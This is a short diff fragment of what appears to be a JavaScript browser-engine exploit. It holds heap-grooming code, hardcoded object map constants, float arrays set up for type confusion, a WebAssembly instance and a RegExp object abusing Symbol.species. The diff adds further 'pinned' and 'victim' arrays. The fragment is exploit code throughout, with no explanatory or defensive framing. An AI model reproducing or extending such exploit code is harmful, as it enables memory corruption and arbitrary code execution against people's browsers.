@@ -14,8 +14,10 @@ function trash(n){for(let i=0;i<n;i++)new Array(0x400).fill(1.1);}
 
 const DMAP=0x1032a5d,EMPTY=0x7e5,PIN=0x1100011,MAXS=0x7fdffffe;
 const pinned=new Array(0x8000);for(let i=0;i<pinned.length;i++)pinned[i]=10.125+i*0.001;
+const pinnedObj=new Array(0x8000);for(let i=0;i<pinnedObj.length;i++)pinnedObj[i]=null;
 const wasmI=new WebAssembly.Instance(new WebAssembly.Module(
   new Uint8Array([0,97,115,109,1,0,0,0,1,5,1,96,0,1,127,3,2,1,0,7,5,1,1,102,0,0,10,6,1,4,0,65,42,11])));
+const victim=[1.22,1.33,1.44];
 const re=/(?:)/;
 const fk={flags:"g",lastIndex:1073741823,constructor:{[Symbol.species]:function(){return re;}}};
 const c0=w2f(DMAP,EMPTY),c1=w2f(PIN,MAXS);
